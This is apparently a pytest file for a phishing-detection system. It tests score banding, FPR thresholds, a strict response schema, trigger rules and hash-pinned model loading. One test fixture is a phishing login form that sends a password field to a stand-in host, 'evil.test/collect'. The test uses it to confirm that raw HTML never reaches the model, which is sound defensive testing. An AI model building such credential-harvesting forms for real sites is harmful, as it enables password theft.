"""Phase 4 snapshot/band/trigger tests (criterion 4 + §2 tie obligation).

- `threshold_at_fpr`, `fpr_interval_report` and the cascade's bucketing share
  one comparison direction (`score >= t`), with explicit rows at `lower_edge`,
  at `t_alert`, and at `nextafter(t_alert, +inf)`, checked against a
  hand-computed FPR.
- Every row falls in exactly one bucket (half-open); the 5% budget is
  benign-only and achieved-not-nominal.
- Raw HTML is never transmitted: the model-text renderer takes an extract,
  never bytes/markup.
- The Step-0 trigger is mechanical: only all-three-conditions fires option 2.
"""

import hashlib
import json
import math
from pathlib import Path

import numpy as np
import pandas as pd

import eval as E
from phishnet.llm.schema import RESPONSE_SCHEMA, is_strict_compatible
from phishnet.snapshot import bands
from phishnet.snapshot.extract import canonical_extract, to_model_text
from phishnet.snapshot.trigger import OPTION1, OPTION2, trigger_verdict


def _hand_fpr(scores: np.ndarray, labels: np.ndarray, thr: float) -> float:
    neg = scores[labels == 0]
    return float((neg >= thr).sum() / neg.size)


def test_bucket_boundaries_are_half_open() -> None:
    lo, hi = 0.3, 0.9
    assert bands.bucket(0.2999, lo, hi) == bands.BELOW
    assert bands.bucket(lo, lo, hi) == bands.BAND  # lower edge IN band
    assert bands.bucket(0.8999, lo, hi) == bands.BAND
    assert bands.bucket(hi, lo, hi) == bands.ALERT  # t_alert IN alert
    assert bands.bucket(math.nextafter(hi, math.inf), lo, hi) == bands.ALERT
    assert bands.bucket(float("inf"), lo, hi) == bands.ALERT


def test_every_row_in_exactly_one_bucket() -> None:
    lo, hi = 0.3, 0.9
    rng = np.random.default_rng(0)
    scores = np.concatenate(
        [rng.uniform(0, 1, 500), [lo, hi, math.nextafter(hi, math.inf)]]
    )
    buckets = [bands.bucket(float(s), lo, hi) for s in scores]
    assert all(b in (bands.BELOW, bands.BAND, bands.ALERT) for b in buckets)
    assert sum(b == bands.BAND for b in buckets) == sum(
        1 for s in scores if lo <= s < hi
    )


def test_threshold_buckets_share_comparison_direction() -> None:
    rng = np.random.default_rng(7)
    scores = rng.uniform(0, 1, 400)
    labels = (rng.uniform(0, 1, 400) < 0.4).astype(int)
    labels[::7] = 0  # ensure benign mass
    for target in (0.005, 0.055):
        thr = E.threshold_at_fpr(labels, scores, target)
        assert _hand_fpr(scores, labels, thr) <= target + 1e-12
        # One notch down the benign order must exceed budget (lowest thr
        # within budget) unless every benign score ties at thr.
        assert _hand_fpr(scores, labels, math.nextafter(thr, -math.inf)) >= (
            _hand_fpr(scores, labels, thr)
        )


def test_nextafter_phishing_anchor_sits_in_alert() -> None:
    lo, hi = 0.3, 0.9
    anchor = math.nextafter(hi, math.inf)
    assert anchor > hi
    assert bands.bucket(anchor, lo, hi) == bands.ALERT
    assert bands.in_band(anchor, lo, hi) is False


def test_model_text_never_carries_raw_html() -> None:
    html = (
        "<html><head><title>T</title></head><body>"
        "<form action='https://evil.test/collect'>"
        "<input type='password' name='pw'></form>"
        "<script>var x='<div>markup ينhere</div>';</script>"
        "</body></html>"
    )
    extract = canonical_extract(html, "http://victim.test/login")
    text = to_model_text(extract)
    assert "<div>" not in text
    assert "var x=" not in text
    assert "<untrusted_page_extract>" in text
    assert isinstance(extract["forms"], list)


def test_response_schema_is_strict_compatible() -> None:
    assert is_strict_compatible(RESPONSE_SCHEMA)
    assert set(RESPONSE_SCHEMA["required"]) == set(RESPONSE_SCHEMA["properties"])
    assert RESPONSE_SCHEMA["additionalProperties"] is False


def _manifest(rows: list[tuple[int, str, str]]) -> pd.DataFrame:
    return pd.DataFrame(
        [{"label": lab, "era": era, "outcome": oc} for lab, era, oc in rows]
    )


def test_trigger_requires_all_three_conditions() -> None:
    good = (
        [(1, "train", "ok")] * 80
        + [(1, "train", "timeout")] * 20
        + [(0, "train", "ok")] * 82
        + [(0, "train", "timeout")] * 18
        + [(1, "test", "ok")] * 78
        + [(1, "test", "timeout")] * 22
        + [(0, "test", "ok")] * 80
        + [(0, "test", "timeout")] * 20
    )
    verdict = trigger_verdict(_manifest(good))
    assert verdict["option"] == OPTION2

    # Train phish below 40% -> option 1.
    bad_train = (
        [(1, "train", "ok")] * 30
        + [(1, "train", "timeout")] * 70
        + [(0, "train", "ok")] * 95
        + [(0, "train", "timeout")] * 5
        + [(1, "test", "ok")] * 90
        + [(1, "test", "timeout")] * 10
        + [(0, "test", "ok")] * 90
        + [(0, "test", "timeout")] * 10
    )
    assert trigger_verdict(_manifest(bad_train))["option"] == OPTION1

    # Test gap above 0.05 -> option 1 even with good train.
    bad_gap = (
        [(1, "train", "ok")] * 80
        + [(1, "train", "timeout")] * 20
        + [(0, "train", "ok")] * 82
        + [(0, "train", "timeout")] * 18
        + [(1, "test", "ok")] * 50
        + [(1, "test", "timeout")] * 50
        + [(0, "test", "ok")] * 95
        + [(0, "test", "timeout")] * 5
    )
    assert trigger_verdict(_manifest(bad_gap))["option"] == OPTION1


def test_tier1_loads_pinned_row_a() -> None:
    """The headline path loads row (a) by hash, never a substitute.

    The "0.94" this guards against: a 200-row calib probe scored the same
    URLs through `GbmSingle(backend/ablation_lexical_assets)` and through
    the headline `EnrichedGbm` path used here, with max abs score
    difference 0.9358 — a different featurisation of the frozen columns, so
    band edges fixed on the shortcut would not match the headline. The
    `refit_base.pkl` Phase 2 champion is a different model on a different
    population and is likewise excluded by the hash assertion.
    """
    from phishnet.snapshot.tier1 import (
        ROW_A_COLUMNS_HASH,
        ROW_A_MODEL_HASH,
        load_row_a,
    )

    # The splits-p3 directory is a committed convenience copy: verify it
    # against the Phase 3 pin before trusting it (prereg §1.1 posture).
    calib_path = Path("data/splits-p3/calib.csv")
    pins = json.loads(Path("repro/hashes-p3.json").read_text(encoding="utf-8"))
    assert hashlib.sha256(calib_path.read_bytes()).hexdigest() == pins["calib.csv"], (
        "splits-p3/calib.csv does not match repro/hashes-p3.json"
    )
    pred = load_row_a("data/splits-p3/calib.csv")
    assert pred.asset_fingerprint["model"] == ROW_A_MODEL_HASH
    assert pred.asset_fingerprint["columns"] == ROW_A_COLUMNS_HASH
    assert pred.asset_fingerprint["canonicalize_scheme"] == "true"
